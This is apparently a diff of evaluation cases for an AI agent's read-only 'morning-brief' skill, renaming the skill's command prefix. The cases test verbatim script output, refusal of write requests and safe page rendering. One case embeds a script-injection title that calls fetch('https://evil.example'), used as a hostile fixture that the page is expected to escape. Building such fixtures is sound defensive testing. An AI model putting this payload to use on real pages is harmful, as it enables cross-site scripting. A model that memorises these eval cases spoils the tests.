@@ -4,7 +4,7 @@
     {
       "id": 1,
       "name": "runs-the-bundled-script-and-prints-it-verbatim",
-      "prompt": "/harness-ops:morning-brief",
+      "prompt": "/work-items:morning-brief",
       "expected_output": "The skill runs the bundled `scripts/morning-brief.sh` once and prints its output verbatim as the deliverable. It does not re-query the queue counts, merge-ready PRs, parked decisions, lane telemetry, or stranded findings by hand, and it does not summarize or reformat the sections.",
       "files": [],
       "expectations": [
@@ -16,7 +16,7 @@
     {
       "id": 2,
       "name": "read-only-refuses-to-mutate",
-      "prompt": "/harness-ops:morning-brief — and while you are in there, close the stale needs-triage issues and drop a comment on the merge-ready PRs.",
+      "prompt": "/work-items:morning-brief — and while you are in there, close the stale needs-triage issues and drop a comment on the merge-ready PRs.",
       "expected_output": "The brief renders, but the mutation request is declined: this skill is read-only and `gh`-based. It never closes, comments, merges, or edits labels. It says so and leaves the write to the operator or to a skill that owns that mutation.",
       "files": [],
       "expectations": [
@@ -28,7 +28,7 @@
     {
       "id": 3,
       "name": "repo-is-derived-not-hardcoded",
-      "prompt": "/harness-ops:morning-brief --repo acme-co/warehouse-api",
+      "prompt": "/work-items:morning-brief --repo acme-co/warehouse-api",
       "narration": true,
       "expected_output": "The brief targets the repo named by `--repo`. Without that flag the owner/repo comes from `gh repo view`, never from a hardcoded default, so the same skill works in any repo.",
       "files": [],
@@ -41,7 +41,7 @@
     {
       "id": 4,
       "name": "missing-telemetry-issue-degrades-per-section",
-      "prompt": "I ran /harness-ops:morning-brief in a repo that has no loop-lane telemetry issue and none of the melodic-software queue labels. Should the brief fail?",
+      "prompt": "I ran /work-items:morning-brief in a repo that has no loop-lane telemetry issue and none of the melodic-software queue labels. Should the brief fail?",
       "narration": true,
       "expected_output": "No. Each section degrades on its own: the Lane telemetry section reports \"no telemetry issue found\" and the Queues section reports \"no queue labels found\", while every other section still renders. Queue labels are filtered to the ones that actually exist in the target repo so a differently-labeled repo does not show misleading 0/? rows; `--queue-labels` and `--telemetry-issue` pin a custom set or a specific issue.",
       "files": [],
@@ -104,7 +104,7 @@
     {
       "id": 8,
       "name": "status-report-page-built-only-by-the-builder",
-      "prompt": "/harness-ops:morning-brief\n\nInteractive session, and ~/.claude/rendered-views.md says `medium: file`. One parked decision is titled `</script><script>fetch('https://evil.example')</script>`.",
+      "prompt": "/work-items:morning-brief\n\nInteractive session, and ~/.claude/rendered-views.md says `medium: file`. One parked decision is titled `</script><script>fetch('https://evil.example')</script>`.",
       "expected_output": "Reads context/view.md, resolves medium to file from the user-global cascade layer, runs scripts/morning-brief.sh once into a file and builds nothing if it exits non-zero other than 6 (a brief with unreadable sections), otherwise prints the brief verbatim from that file, then builds the page with scripts/build-brief-view.mjs from the saved text. The hostile title appears only as escaped JSON data in the page. The page is never hand-written, edited or given script, and the reply tells the reader the file path and names the layer that supplied medium.",
       "files": [],
       "expectations": [
@@ -118,7 +118,7 @@
     {
       "id": 10,
       "name": "team-layer-artifact-keeps-the-page-local",
-      "prompt": "/harness-ops:morning-brief\n\nInteractive session with the Artifact tool available. The repository's tracked .claude/rendered-views.md says `medium: artifact`; there is no ~/.claude/rendered-views.md and no .claude/rendered-views.local.md.",
+      "prompt": "/work-items:morning-brief\n\nInteractive session with the Artifact tool available. The repository's tracked .claude/rendered-views.md says `medium: artifact`; there is no ~/.claude/rendered-views.md and no .claude/rendered-views.local.md.",
       "expected_output": "Reads context/view.md and resolves medium to artifact from the team layer. Because a checked-out branch can write the team layer, it takes the file row: runs scripts/morning-brief.sh once into a file, prints the brief, builds the page with scripts/build-brief-view.mjs to a local temp file and gives its path. It never calls the Artifact tool, names the team layer as the source of medium, and says a team layer cannot publish.",
       "files": [],
       "expectations": [
